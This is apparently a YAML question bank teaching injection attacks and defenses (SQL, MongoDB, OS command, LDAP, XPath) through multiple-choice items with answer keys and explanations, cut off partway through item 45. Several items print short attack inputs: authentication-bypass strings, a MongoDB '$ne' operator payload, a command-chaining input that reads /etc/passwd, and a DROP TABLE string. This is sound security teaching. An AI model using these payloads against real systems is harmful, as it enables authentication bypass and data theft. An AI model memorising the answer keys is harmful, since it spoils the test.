topic: 'Injection Attacks: SQL, NoSQL, Command & LDAP'
domain: security
topic_slug: injection-attacks
version: 1
questions:
- id: injection-attacks-001
  difficulty: beginner
  tags:
  - root-cause
  - fundamentals
  question: |
    At the most fundamental level, what causes an injection vulnerability?
  options:
  - Untrusted data is mixed into an instruction so an interpreter parses attacker data as code/structure
  - The server runs an outdated database engine version with unpatched query-parser bugs
  - The connection between client and server is left unencrypted without any TLS in place
  - The application pulls in too many third-party libraries, enlarging its attack surface
  answer: 0
  explanation: |
    Injection is fundamentally a failure to separate code from data. When
    untrusted input is concatenated into an instruction for an interpreter
    (SQL, shell, LDAP, etc.), the input can break out of its data context and
    be executed as code/structure. This is the shared root cause across all
    injection families.
  ref: concepts.md#root-cause-mixing-untrusted-data-with-code
- id: injection-attacks-002
  difficulty: beginner
  tags:
  - owasp
  - top-10
  question: |
    In the OWASP Top 10 (2021), which category covers injection, and what
    previously separate category was merged into it?
  options:
  - A07 Identification & Authentication Failures; merged with session fixation
  - A05 Security Misconfiguration; merged with XXE
  - A01 Broken Access Control; merged with CSRF
  - A03 Injection; merged with Cross-Site Scripting (XSS)
  answer: 3
  explanation: |
    In the 2021 edition, Injection is A03. The formerly separate Cross-Site
    Scripting category was folded into Injection, since XSS is injection into
    an HTML/JS interpreter.
  ref: concepts.md#root-cause-mixing-untrusted-data-with-code
- id: injection-attacks-003
  difficulty: beginner
  tags:
  - sql-injection
  - example
  question: |
    A login query is built as:
    "SELECT * FROM users WHERE name = '" + input + "'".
    Which input demonstrates a classic SQL injection that always matches?
  options:
  - alice
  - ''' OR ''1''=''1'
  - '%20alice%20'
  - '12345'
  answer: 1
  explanation: |
    "' OR '1'='1" closes the string literal early with a quote and appends an
    always-true OR condition, so the WHERE clause matches every row. The
    attacker's data escaped its intended value context and became SQL logic.
  ref: concepts.md#root-cause-mixing-untrusted-data-with-code
- id: injection-attacks-004
  difficulty: intermediate
  tags:
  - sql-injection
  - union
  question: |
    What must an attacker determine before a UNION-based SQL injection will
    succeed?
  options:
  - The exact server timezone and system clock offset of the host
  - The database administrator's password for the privileged account
  - The number of columns and compatible types in the original SELECT
  - The TLS cipher suite the connection negotiated at handshake time
  answer: 2
  explanation: |
    A UNION-based attack appends "UNION SELECT ..." to the query. For the union
    to be valid, the injected SELECT must return the same number of columns
    with compatible types as the original query, so attackers first probe the
    column count (e.g. ORDER BY n-- or UNION SELECT NULL,NULL,...).
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-005
  difficulty: intermediate
  tags:
  - sql-injection
  - blind
  - time-based
  question: |
    An endpoint returns the same response regardless of input and shows no
    error messages, yet an attacker still extracts data. Which technique is
    most likely being used?
  options:
  - Time-based blind injection using conditional SLEEP/pg_sleep/WAITFOR
  - Reflected cross-site scripting echoed back into the response body
  - Error-based injection reading data from verbose database error output
  - UNION-based injection reading data into the visible result set
  answer: 0
  explanation: |
    With no visible data and no errors ("fully blind"), attackers use
    time-based blind injection: they make the database delay conditionally
    (MySQL SLEEP, Postgres pg_sleep, MS SQL WAITFOR DELAY) and infer each bit
    of data from response latency.
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-006
  difficulty: intermediate
  tags:
  - sql-injection
  - boolean-blind
  question: |
    In boolean-based blind SQL injection, how does the attacker extract data?
  options:
  - By capturing and decrypting the TLS session key to read the query results in transit
  - By reading the leaked data directly out of the HTTP response body returned to the client
  - By injecting a condition and observing whether the page renders the true vs false state, extracting
    data bit by bit
  - By forcing the database to email the extracted result rows to an attacker-controlled inbox
  answer: 2
  explanation: |
    Boolean-based blind SQLi injects a true/false condition (e.g. a SUBSTRING
    comparison) and observes whether the application behaves as if the
    condition were true or false. Repeating this, often with binary search,
    extracts data one bit/character at a time without any data appearing in
    the response.
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-007
  difficulty: intermediate
  tags:
  - sql-injection
  - error-based
  question: |
    Error-based SQL injection depends on which application misconfiguration?
  options:
  - The application serving pages over HTTPS instead of plain HTTP
  - Session cookies being marked HttpOnly and unavailable to scripts
  - The database engine listening on a non-default, non-standard TCP port
  - Verbose database error messages being returned to the client
  answer: 3
  explanation: |
    Error-based SQLi coerces the database into an error whose message contains
    data (e.g. via a forced type-conversion of a subquery result). It only
    works when detailed DB errors are surfaced to the client, which is itself
    a misconfiguration; suppressing verbose errors is defense in depth.
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-008
  difficulty: advanced
  tags:
  - sql-injection
  - out-of-band
  question: |
    What characterizes an out-of-band (OOB) SQL injection technique?
  options:
  - The attacker infers each byte purely from measured response timing latency
  - Data is exfiltrated via a separate channel the attacker controls, e.g. a DNS or HTTP request from
    the database
  - The attack only ever works over an unencrypted, plaintext database connection
  - The stolen results are returned inline within the very same HTTP response body
  answer: 1
  explanation: |
    OOB SQLi is used when data is neither visible in the response nor
    timing-observable. The attacker forces the database to initiate a
    side-channel request (commonly DNS or HTTP) to an attacker-controlled
    domain, encoding stolen data in the request.
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-009
  difficulty: intermediate
  tags:
  - second-order
  - stored
  question: |
    What is second-order (stored) SQL injection?
  options:
  - A SQLi limited to reading only the second row returned by a table scan
  - Injection that fires only on the second HTTP request within a user session
  - A payload that is safely stored first, then later concatenated into a query in a different code path
    where it fires
  - Injection that requires two separate database servers to be chained together
  answer: 2
  explanation: |
    In second-order SQLi, the malicious value is stored without harm (e.g. a
    username "admin'--" inserted via a parameterized query), then later read
    back and concatenated into another query where it executes. The lesson:
    data from your own database is still untrusted at the point it re-enters a
    query.
  ref: concepts.md#second-order-and-stacked-query-sql-injection
- id: injection-attacks-010
  difficulty: intermediate
  tags:
  - second-order
  - defense
  question: |
    A username field parameterizes its INSERT at registration, but a later
    "change password" feature builds an UPDATE by concatenating the stored
    username. Why is this still vulnerable?
  options:
  - Because the stored value is untrusted at the new sink and is concatenated there without parameterization
  - Because parameterized INSERT statements run measurably slower than concatenated ones
  - Because the password column lacks an index, forcing an unsafe full-table scan
  - Because INSERT statements can never be parameterized, only SELECT statements can
  answer: 0
  explanation: |
    This is the classic second-order scenario. Parameterizing only the query
    that receives the request parameter is not enough; the value read back
    from the DB is still untrusted at the second sink. Every query, including
    those built from stored data, must be parameterized.
  ref: concepts.md#second-order-and-stacked-query-sql-injection
- id: injection-attacks-011
  difficulty: advanced
  tags:
  - stacked-queries
  - drivers
  question: |
    Which statement about stacked (batched) queries like "'; DROP TABLE x; --"
    is correct?
  options:
  - They are completely impossible in any modern database engine released in the last decade
  - They only ever work when TLS encryption on the client-to-server connection has been disabled
  - They always work reliably and identically on every database engine and every client driver
  - Whether they work depends on the database and driver; some execute only the first statement per call,
    so this is not a reliable defense to rely on
  answer: 3
  explanation: |
    Support for stacked queries varies: MS SQL Server and PostgreSQL often
    allow them, while the classic MySQL C API and many drivers run only the
    first statement per call. You must not treat "our driver blocks stacking"
    as a security control, and it does nothing against UNION/blind techniques.
  ref: concepts.md#second-order-and-stacked-query-sql-injection
- id: injection-attacks-012
  difficulty: beginner
  tags:
  - parameterized-queries
  - primary-fix
  question: |
    What is the single most reliable primary defense against SQL injection?
  options:
  - Deploying a Web Application Firewall to filter malicious requests at the edge
  - Parameterized queries / prepared statements that bind data separately from the query structure
  - Renaming database tables to non-obvious names to hide them from attackers
  - Escaping every single quote found anywhere in the user-supplied input
  answer: 1
  explanation: |
    Parameterized queries send the query template with placeholders to the
    engine first (fixing the structure), then supply values separately as pure
    data. A bound parameter can never change the query's structure, making
    injection structurally impossible. Escaping and WAFs are secondary.
  ref: concepts.md#the-correct-fix-parameterized-queries-and-prepared-statements
- id: injection-attacks-013
  difficulty: intermediate
  tags:
  - parameterized-queries
  - mechanism
  question: |
    Why does a bound parameter in a prepared statement prevent injection even
    if the value contains a single quote or "OR 1=1"?
  options:
  - The query structure is parsed and fixed before the value is attached, so the value is only ever treated
    as data, never re-parsed as SQL
  - The database engine refuses any bound value containing reserved SQL keywords
  - The value is transparently encrypted by the driver before it is ever stored
  - The driver silently strips out all dangerous metacharacters from the value
  answer: 0
  explanation: |
    With prepared statements the engine parses the query template (with
    placeholders) and fixes its structure before any value is bound. The bound
    value fills a placeholder as literal data and is never reparsed as SQL, so
    its contents cannot alter the query's meaning. It is not stripping or
    escaping.
  ref: concepts.md#the-correct-fix-parameterized-queries-and-prepared-statements
- id: injection-attacks-014
  difficulty: intermediate
  tags:
  - parameterized-queries
  - identifiers
  question: |
    A feature lets users sort results by a column name they supply. Why can't
    you just bind the column name as a query parameter, and what is the right
    approach?
  options:
  - You must escape the column name with backslashes and then concatenate it into the query
  - You should disable the sorting feature entirely, because it can never be made safe
  - You can bind the column name directly, since column names are just ordinary values
  - Placeholders bind values, not identifiers/keywords; validate the column against a strict allowlist
    of known-good names
  answer: 3
  explanation: |
    Placeholders bind values, not identifiers such as table/column names,
    ORDER BY targets, or ASC/DESC, which are part of the query structure. For
    dynamic identifiers, map user input against a fixed allowlist of permitted
    names rather than concatenating it.
  ref: concepts.md#the-correct-fix-parameterized-queries-and-prepared-statements
- id: injection-attacks-015
  difficulty: intermediate
  tags:
  - priority
  - owasp
  question: |
    Per the OWASP SQL Injection Prevention Cheat Sheet, which ordering of
    defenses (primary to last resort) is correct?
  options:
  - Escaping, then WAF, then prepared statements, then stored procedures
  - Prepared statements, then properly used stored procedures, then allowlist validation, then escaping
    as a last resort
  - Keyword blocklists, then column encryption, then prepared statements as a fallback
  - WAF first, then strict input length limits, then prepared statements as a last resort
  answer: 1
  explanation: |
    OWASP prioritizes: (1) parameterized/prepared statements, (2) properly used
    stored procedures, (3) allowlist input validation (for identifiers you
    can't parameterize), and (4) escaping user input as a last resort. Options
    3 and 4 are defense in depth, not the primary fix; WAFs are not the fix.
  ref: concepts.md#the-correct-fix-parameterized-queries-and-prepared-statements
- id: injection-attacks-016
  difficulty: intermediate
  tags:
  - escaping
  - why-not
  question: |
    Why does quote-escaping fail to protect a query like
    "... WHERE id = " + input (with no surrounding quotes)?
  options:
  - Because integer values in a query simply cannot be injected at all
  - Because quote-escaping only adds latency and slows the query down
  - Because in a numeric/unquoted context an input like '1 OR 1=1' needs no quote to inject, so escaping
    quotes does nothing
  - Because the database engine automatically un-escapes the value before parsing it
  answer: 2
  explanation: |
    Quote-escaping only helps inside quoted string literals. When the value is
    used unquoted (numeric context), a payload like "1 OR 1=1" injects logic
    without any quote, so escaping quotes provides no protection. This is one
    reason escaping is fragile and not the primary defense.
  ref: concepts.md#why-escaping-and-blocklists-are-not-the-fix
- id: injection-attacks-017
  difficulty: intermediate
  tags:
  - blocklists
  - why-not
  question: |
    Which pair of problems best describes why blocklisting SQL keywords/
    characters is a poor primary defense?
  options:
  - It breaks legitimate data (e.g. O'Brien) and is trivially bypassed (uNiOn, UN/**/ION, encodings)
  - It requires a paid enterprise license and a dedicated WAF appliance to run
  - It only works on PostgreSQL and silently fails on every other database engine
  - It is far too slow at scale and consumes an excessive amount of server memory
  answer: 0
  explanation: |
    Blocklists reject legitimate values (names with apostrophes, passwords with
    "--") and are easy to bypass via case variation, inline comments,
    alternate encodings, and equivalent syntax. The defender must block every
    variant; the attacker needs just one that slips through.
  ref: concepts.md#why-escaping-and-blocklists-are-not-the-fix
- id: injection-attacks-018
  difficulty: advanced
  tags:
  - escaping
  - encoding
  - charset
  question: |
    How can a multibyte character-set (e.g. GBK) attack defeat naive
    backslash-escaping of quotes?
  options:
  - Escaping doubles the stored byte size of the value, causing silent truncation
  - The database engine ignores backslash-escaping entirely whenever UTF-8 is in use
  - A crafted multibyte sequence can consume the escaping backslash into a valid character, leaving the
    following quote unescaped
  - Multibyte character sets silently disable prepared statements at the driver level
  answer: 2
  explanation: |
    In classic multibyte attacks, a byte sequence combines with the escaping
    backslash to form one valid multibyte character, so the backslash is
    "consumed" and the following quote is left unescaped, breaking out of the
    literal. This shows escaping is charset-dependent and error-prone;
    parameterization avoids the problem entirely.
  ref: concepts.md#why-escaping-and-blocklists-are-not-the-fix
- id: injection-attacks-019
  difficulty: intermediate
  tags:
  - allowlist
  - validation
  question: |
    What is the correct role of allowlist input validation in preventing SQL
    injection?
  options:
  - It only matters for numeric fields, because string inputs are automatically sanitized by the database driver
  - It is the primary and complete defense against injection, fully replacing the need for prepared statements
  - It is useless against injection and should therefore never be used or relied on in any application
  - It is defense in depth and the right tool for values you cannot parameterize, such as dynamic identifiers
  answer: 3
  explanation: |
    Allowlist validation (accept only known-good types/formats/values) is
    valuable as defense in depth and is the correct mechanism for identifiers
    that cannot be bound (e.g. a sort column chosen from 4 options). It is not
    a substitute for parameterization.
  ref: concepts.md#why-escaping-and-blocklists-are-not-the-fix
- id: injection-attacks-020
  difficulty: intermediate
  tags:
  - orm
  - pitfalls
  question: |
    An ORM parameterizes queries by default. Which usage most likely
    reintroduces SQL injection?
  options:
  - Using the ORM's standard .filter(name=value) API with all values bound as parameters
  - Calling a raw/native query method with a string built by concatenating user input
  - Letting the ORM auto-generate the fully parameterized SQL for a normal find-by-id lookup
  - Using named parameters inside a repository method's query annotation
  answer: 1
  explanation: |
    ORMs reduce SQLi because they bind parameters, but raw/native query escape
    hatches (rawQuery, .raw(), nativeQuery, $queryRawUnsafe, string HQL/JPQL)
    built by concatenation reintroduce classic injection. Treat every raw
    escape hatch as if writing raw SQL and parameterize it.
  ref: concepts.md#orm-and-query-builder-pitfalls
- id: injection-attacks-021
  difficulty: advanced
  tags:
  - orm
  - hql
  - jpql
  question: |
    Which statement about HQL/JPQL (object query languages) and injection is
    correct?
  options:
  - Only native SQL, and never an object query language such as HQL or JPQL, can ever be injected
  - HQL and JPQL are fully immune to injection because they operate on mapped objects rather than raw tables
  - String-interpolating user input into HQL/JPQL is still injection; use named parameters like :param
  - Injection into HQL can corrupt in-memory objects but can never read the underlying database data
  answer: 2
  explanation: |
    HQL/JPQL are still query languages; concatenating user input into them is
    injection into an object-query interpreter. The fix mirrors SQL: use named
    or positional parameters (e.g. :param) rather than building the query
    string.
  ref: concepts.md#orm-and-query-builder-pitfalls
- id: injection-attacks-022
  difficulty: intermediate
  tags:
  - orm
  - order-by
  question: |
    Passing user input directly into an ORM method like .order_by(userInput)
    or .extra(where=[userInput]) is risky mainly because:
  options:
  - These accept raw SQL fragments/identifiers that are not bound as parameters
  - They always crash whenever the string they are given happens to be empty or null
  - They automatically escape every metacharacter internally, so passing raw user input is harmless
  - They only ever execute against read-only replicas, so no data can be modified
  answer: 0
  explanation: |
    Methods that accept raw fragments or identifiers (order_by columns, extra
    where clauses, sql= arguments) are not value-bound parameters; user-
    controlled input there can inject SQL structure. Use allowlists for
    identifiers and bound parameters for values.
  ref: concepts.md#orm-and-query-builder-pitfalls
- id: injection-attacks-023
  difficulty: beginner
  tags:
  - nosql
  - mongodb
  - operator-injection
  question: |
    A login runs db.users.find({ username: body.username, password:
    body.password }) with the parsed JSON body passed straight in. What
    malicious body bypasses the password check?
  options:
  - '{ "username": "alice" }'
  - '{ "username": null, "password": null }'
  - '{ "username": "alice", "password": "alice" }'
  - '{ "username": "alice", "password": { "$ne": "" } }'
  answer: 3
  explanation: |
    Sending password as { "$ne": "" } injects a MongoDB query operator meaning
    "password not equal to empty string," which matches the stored hash and
    logs the attacker in as alice without knowing the password. This is
    MongoDB operator injection.
  ref: concepts.md#nosql-injection-mongodb-operator-injection
- id: injection-attacks-024
  difficulty: intermediate
  tags:
  - nosql
  - root-cause
  question: |
    How does NoSQL (MongoDB) injection differ syntactically from classic SQL
    injection, despite sharing a root cause?
  options:
  - NoSQL injection requires no untrusted input at all, arising purely from the database's own internal indexing logic
  - SQLi breaks out with a quote into keywords; NoSQL injection breaks out with an operator/object like
    $ne, $gt, or $where
  - NoSQL injection can only ever cause denial of service by overloading the query planner, never data exposure
  - NoSQL injection only works when the client talks to the database over a persistent WebSocket connection
  answer: 1
  explanation: |
    Both stem from untrusted data being reinterpreted as query structure. SQLi
    typically breaks out of a quoted string into SQL keywords; MongoDB
    injection substitutes an operator or query object ($ne, $gt, $regex,
    $where) where the app expected a scalar value.
  ref: concepts.md#nosql-injection-mongodb-operator-injection
- id: injection-attacks-025
  difficulty: advanced
  tags:
  - nosql
  - where
  - javascript
  question: |
    Which MongoDB operator is especially dangerous because it can execute
    attacker-supplied JavaScript on the server?
  options:
  - $where
  - $set
  - $gt
  - $in
  answer: 0
  explanation: |
    $where (and mapReduce with JS) evaluates JavaScript server-side. If user
    input reaches it, an attacker can run arbitrary JS in the database context.
    Disabling server-side JavaScript and never passing user data into such
    expressions is the defense.
  ref: concepts.md#nosql-injection-mongodb-operator-injection
- id: injection-attacks-026
  difficulty: intermediate
  tags:
  - nosql
  - defense
  - type-check
  question: |
    What is the primary defense against MongoDB operator injection in a login
    form?
  options:
  - Rename the users collection to a non-obvious internal name so attackers cannot guess the query target
  - Add a WAF rule that blocks any request body containing the literal word 'password' at the network edge
  - Encrypt the stored password field at rest with a per-document key so operator objects cannot decrypt it
  - Enforce that username and password are strings (reject objects/arrays) before they reach the query
  answer: 3
  explanation: |
    The core fix is type enforcement: validate that fields expected to be
    scalars are actually strings and reject objects/arrays, so an attacker
    cannot smuggle an operator object. Never pass raw user-controlled objects
    directly as a query document.
  ref: concepts.md#nosql-injection-mongodb-operator-injection
- id: injection-attacks-027
  difficulty: advanced
  tags:
  - nosql
  - query-string
  - parsing
  question: |
    Some frameworks parse a query string like "user[password][$ne]=" into a
    nested object. Why does this matter for NoSQL injection?
  options:
  - It compresses the request body on the wire, hiding the malicious operator from any inspection
  - It can turn a field expected to be a string into an operator object without the attacker sending any
    JSON
  - It disables the driver's prepared statements, forcing every query to be built by string concatenation
  - It only affects GET requests routed to static file handlers, never dynamic API endpoints that query the database
  answer: 1
  explanation: |
    Nested bracket parsing (or extended body parsers) can convert
    user[password][$ne]= into { password: { $ne: ... } }, injecting an operator
    object even from a form/query string. This is why type-checking (reject
    objects where a string is expected) matters regardless of content type.
  ref: concepts.md#nosql-injection-mongodb-operator-injection
- id: injection-attacks-028
  difficulty: beginner
  tags:
  - command-injection
  - shell
  question: |
    An app runs system("ping -c 1 " + input) via the shell. What does input
    "8.8.8.8; cat /etc/passwd" do?
  options:
  - Pings 8.8.8.8 only; the shell treats the trailing text as an inert comment and silently discards it
  - Causes a fatal argument-parsing syntax error in ping, so no host is contacted and nothing runs at all
  - Runs ping and then cat /etc/passwd, because the shell interprets ';' as a command separator
  - Encrypts /etc/passwd in place, because the shell interprets the payload as a file-permission command
  answer: 2
  explanation: |
    Because the string is handed to a shell, the ';' metacharacter chains a
    second command, so both ping and cat /etc/passwd run. This is OS command
    injection (CWE-78).
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-029
  difficulty: intermediate
  tags:
  - command-injection
  - argv
  - fix
  question: |
    What is the correct primary fix for OS command injection?
  options:
  - Avoid the shell; execute the program with its arguments as separate array (argv) elements so input
    is treated as a single argument
  - Run the command as the root user so elevated permissions let it always succeed without shell errors
  - Add every known dangerous shell metacharacter to a denylist and reject any input that contains one
  - Escape every shell metacharacter in the input string with backslashes before handing it to the shell
  answer: 0
  explanation: |
    The analogue of parameterized queries for the OS is passing an argv array
    directly to the exec syscall (no shell). Then "8.8.8.8; cat /etc/passwd"
    is one argument (a bogus hostname), with no shell to interpret ';'. Avoid
    shell modes like shell=True or sh -c.
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-030
  difficulty: advanced
  tags:
  - argument-injection
  - argv
  question: |
    You switched to an argv array (no shell). Why can argument injection still
    be a problem?
  options:
  - It is not a problem; argv arrays are always fully safe against every class of injection attack
  - The argv array secretly re-invokes a background shell to join its elements before running the program
  - If user input can start with '-'/'--', the target program may parse it as an option/flag rather than
    data, changing its behavior
  - argv arrays cannot contain spaces, so any user value with a space silently splits into extra arguments
  answer: 2
  explanation: |
    An argv array stops command chaining but not argument injection: a value
    beginning with '-' may be interpreted as a flag (e.g. --output=, ssh
    -oProxyCommand=, curl --upload-file). Defenses include allowlist-validating
    values and using '--' to signal end-of-options.
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-031
  difficulty: intermediate
  tags:
  - argument-injection
  - end-of-options
  question: |
    Which mitigation specifically helps against argument injection when
    shelling out to a tool that supports it?
  options:
  - Running the tool twice and comparing the two outputs to detect any injected flags
  - Setting shell=True so the interpreter normalizes and canonicalizes the arguments safely
  - Prefixing every argument with a leading space so the parser treats it as an operand
  - Using '--' to mark the end of options so subsequent tokens are treated as operands, plus allowlisting
    values
  answer: 3
  explanation: |
    Many tools treat '--' as "end of options," so tokens after it are operands,
    not flags. Combined with allowlist validation of values and never letting
    user input supply flags, this mitigates argument injection.
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-032
  difficulty: intermediate
  tags:
  - command-injection
  - metacharacters
  question: |
    Which of these are shell metacharacters an attacker could abuse in command
    injection?
  options:
  - Only letters and digits
  - ; && || | ` $( ) > < and newline
  - Only the '@' symbol
  - Only whitespace characters
  answer: 1
  explanation: |
    Shells interpret many metacharacters for chaining, piping, command
    substitution, and redirection: ; && || | backtick $( ) > < and newlines,
    among others. This is why relying on blocklisting them is fragile and
    avoiding the shell is preferred.
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-033
  difficulty: beginner
  tags:
  - ldap
  - injection
  question: |
    An LDAP auth filter is built as (&(uid=<input>)(userPassword=<pw>)). What
    does supplying uid input "*" do?
  options:
  - Forces the LDAP connection to renegotiate and upgrade to TLS before binding
  - Nothing; the '*' character is always rejected outright by the LDAP filter parser
  - Matches any uid via wildcard, enabling enumeration or auth bypass
  - Deletes the entire directory subtree, because '*' is the LDAP wildcard-delete operator
  answer: 2
  explanation: |
    In LDAP filter syntax '*' is a wildcard. (&(uid=*)(...)) matches any uid,
    enabling enumeration or, combined with other tricks, authentication bypass.
    This is LDAP injection (CWE-90).
  ref: concepts.md#ldap-injection
- id: injection-attacks-034
  difficulty: intermediate
  tags:
  - ldap
  - defense
  - rfc4515
  question: |
    Which is the primary practical defense against LDAP search-filter
    injection, and why does it differ from SQL's primary defense?
  options:
  - Context-correct escaping of filter metacharacters per RFC 4515 (plus allowlisting), because LDAP libraries
    typically lack SQL-style bind placeholders
  - Disabling LDAP entirely and moving all authentication to a separate database
  - Base64-encoding the whole assembled filter string before sending it to the directory
  - Prepared statements with '?' placeholders bound by the LDAP library, identical to SQL
  answer: 0
  explanation: |
    Unlike SQL drivers, LDAP libraries usually don't offer bind placeholders,
    so the primary practical defense is escaping the filter special characters
    per RFC 4515 (\ * ( ) NUL -> \5c \2a \28 \29 \00) via a safe builder, plus
    allowlist validation.
  ref: concepts.md#ldap-injection
- id: injection-attacks-035
  difficulty: advanced
  tags:
  - ldap
  - escaping
  - dn-vs-filter
  question: |
    When defending LDAP code, why must you distinguish DN escaping from search
    filter escaping?
  options:
  - DNs cannot contain user input, so only search filters ever need any escaping at all
  - Filter escaping is only needed over plaintext LDAP; an LDAPS/TLS connection escapes automatically
  - They are identical rule sets, so applying either escaper to either context is always pointless
  - The two contexts (DN per RFC 4514 vs search filter per RFC 4515) have different metacharacters and
    escaping rules
  answer: 3
  explanation: |
    Distinguished Name escaping follows RFC 4514 while search-filter escaping
    follows RFC 4515; the special characters and encoding rules differ. Using
    the wrong escaper for the context leaves an injection hole.
  ref: concepts.md#ldap-injection
- id: injection-attacks-036
  difficulty: intermediate
  tags:
  - ldap
  - metacharacters
  question: |
    Which characters are the key LDAP search-filter metacharacters an attacker
    abuses?
  options:
  - Only the '@' and '#' symbols
  - ( ) * & | ! = and NUL
  - Only the '.' character
  - Only digits 0-9
  answer: 1
  explanation: |
    LDAP filters (RFC 4515) use prefix/parenthesized syntax; the metacharacters
    ( ) * & | ! = and NUL control grouping, wildcards, and boolean logic, so
    unescaped user input containing them can rewrite the filter.
  ref: concepts.md#ldap-injection
- id: injection-attacks-037
  difficulty: intermediate
  tags:
  - xpath
  - injection
  question: |
    An XPath auth query is /users/user[username/text()='<in>' and
    password/text()='<pw>']. Which username input bypasses authentication?
  options:
  - ''' or ''1''=''1'
  - '%00'
  - '12345'
  - admin
  answer: 0
  explanation: |
    XPath injection closely mirrors SQLi. "' or '1'='1" makes the predicate
    always true, bypassing authentication. XPath, like SQL, mixes string
    literals and boolean logic, so the same break-out pattern applies (CWE-643).
  ref: concepts.md#xpath-and-other-query-language-injection
- id: injection-attacks-038
  difficulty: advanced
  tags:
  - xpath
  - defense
  question: |
    What is the recommended primary defense against XPath injection?
  options:
  - Store all user passwords in the XML document as plaintext so the XPath predicate can compare them directly without hashing
  - Rely on a web application firewall to strip apostrophes and quotes from every request before the XPath expression runs
  - Disable XML parsing across the whole application and migrate every stored document to a flat key-value format instead
  - Parameterize XPath using precompiled expressions with variable binding, so user data fills variables
    rather than expression text
  answer: 3
  explanation: |
    As with SQL, the correct fix is to bind user data to variables in a
    precompiled XPath expression (variable resolver APIs) rather than
    concatenating it into the expression. Where binding is unavailable, escape
    for the XPath string context and allowlist-validate.
  ref: concepts.md#xpath-and-other-query-language-injection
- id: injection-attacks-039
  difficulty: advanced
  tags:
  - xpath
  - blind
  question: |
    Blind XPath injection extracts an XML document by:
  options:
  - Reading the whole document straight out of a verbose parser error that echoes matched nodes each request
  - Using substring() and string-length() with true/false observation to reconstruct nodes one piece at
    a time
  - Instructing the XPath engine to open an FTP session and download the backing XML file to the attacker
  - Forcing the parser to call a mail function that sends the whole document to an attacker-controlled inbox
  answer: 1
  explanation: |
    Blind XPath injection, like blind SQLi, uses functions such as substring()
    and string-length() combined with true/false response observation to
    reconstruct the document node by node when no data is directly returned.
  ref: concepts.md#xpath-and-other-query-language-injection
- id: injection-attacks-040
  difficulty: intermediate
  tags:
  - other-injection
  - families
  question: |
    Which of these is also an injection-family vulnerability sharing the "data
    reparsed as code/structure" pattern?
  options:
  - A slow garbage collector pausing the process long enough to stall in-flight queries under load
  - Clock skew between servers causing tokens and cache entries to expire earlier than intended
  - Server-side template injection (SSTI) / expression-language injection (SpEL, OGNL)
  - A missing database index forcing full-table scans that degrade query latency at scale
  answer: 2
  explanation: |
    Template/expression-language injection (SSTI, SpEL, OGNL) is another
    injection family: untrusted data is evaluated as expression/template code.
    Like XXE, log injection, and CRLF/header injection, it shares the same root
    cause and is cured by keeping data out of the code channel.
  ref: concepts.md#xpath-and-other-query-language-injection
- id: injection-attacks-041
  difficulty: beginner
  tags:
  - least-privilege
  - defense-in-depth
  question: |
    Why should an application connect to its database with a least-privilege
    account even if all queries are parameterized?
  options:
  - 'As defense in depth: it bounds the damage if an injection ever slips through (no DDL, no OS commands,
    limited tables)'
  - Because parameterized queries only bind correctly when the connection holds database administrator rights
  - To avoid needing a stored password, since least-privilege accounts authenticate purely by network address
  - To make queries run measurably faster, because restricted accounts skip the engine's permission-check overhead
  answer: 0
  explanation: |
    Parameterization can be undone by one future raw query or a vulnerable
    dependency. A least-privilege DB account (only needed CRUD on specific
    tables, no DBA/DDL/FILE) limits a successful injection to what that account
    could already do, turning a takeover into a bounded read.
  ref: concepts.md#least-privilege-and-defense-in-depth
- id: injection-attacks-042
  difficulty: intermediate
  tags:
  - least-privilege
  - dangerous-features
  question: |
    Which database features are commonly disabled as part of defense-in-depth
    against injection escalation?
  options:
  - Connection pooling, which is turned off so each injection attempt must open its own costly connection
  - The core SELECT and INSERT permissions the application relies on for all its normal read/write traffic
  - xp_cmdshell (MS SQL), server-side JS/$where (Mongo), LOAD_FILE/INTO OUTFILE (MySQL)
  - Primary key and foreign key constraints, disabled so the schema no longer enforces row uniqueness
  answer: 2
  explanation: |
    Features that let a query touch the OS or filesystem are prime escalation
    targets: xp_cmdshell, server-side JavaScript/$where, and
    LOAD_FILE/INTO OUTFILE. Disabling them (unless truly needed) limits how far
    an injection can go.
  ref: concepts.md#least-privilege-and-defense-in-depth
- id: injection-attacks-043
  difficulty: intermediate
  tags:
  - defense-in-depth
  - verbose-errors
  question: |
    Suppressing verbose database errors to clients primarily defends against
    which technique (and is which kind of control)?
  options:
  - OS command injection; the single sufficient control that removes any need for parameterization
  - LDAP filter injection; an encryption control that scrambles directory responses in transit
  - Time-based blind SQLi; a primary structural fix that removes the underlying vulnerability
  - Error-based SQLi and info leakage; a defense-in-depth control, not a primary fix
  answer: 3
  explanation: |
    Generic error pages remove the data channel that error-based SQLi relies on
    and reduce information leakage. It is defense in depth: it does not stop
    blind/time-based techniques, so parameterization remains the primary fix.
  ref: concepts.md#least-privilege-and-defense-in-depth
- id: injection-attacks-044
  difficulty: intermediate
  tags:
  - stored-procedures
  - nuance
  question: |
    Under what condition is a stored procedure NOT safe against SQL injection?
  options:
  - When it returns more than one row, because multi-row result sets let an attacker smuggle extra columns
  - When it builds and executes dynamic SQL by concatenating its parameters (e.g. EXEC('...' + @p))
  - When it is called with bound parameters, since the binding layer re-parses each value as SQL on the way in
  - When it uses static SQL with its parameters passed as ordinary values through the normal call interface
  answer: 1
  explanation: |
    A stored procedure is only safe if it doesn't build dynamic SQL from its
    parameters by concatenation. A proc doing EXEC('SELECT ... =' + @p) is just
    as injectable as inline concatenation; the vulnerability merely moved into
    the database.
  ref: concepts.md#stored-procedures-nuance
- id: injection-attacks-045
  difficulty: advanced
  tags:
  - stored-procedures
  - dynamic-sql
  question: |
    If a stored procedure genuinely must build dynamic SQL, what is the safe
    way to do it?
  options:
  - Wrap the string concatenation inside a TRY/CATCH block so any injection attempt is caught as an exception
  - Concatenate the parameters into the SQL text after escaping every single quote you find in each value
  - Use sp_executesql (or the DB's equivalent) with parameter markers, not string concatenation
  - Grant the procedure database-administrator rights so the elevated context lets it run the query safely
  answer: 2
  explanation: |
    Dynamic SQL inside a proc should still be parameterized: use sp_executesql
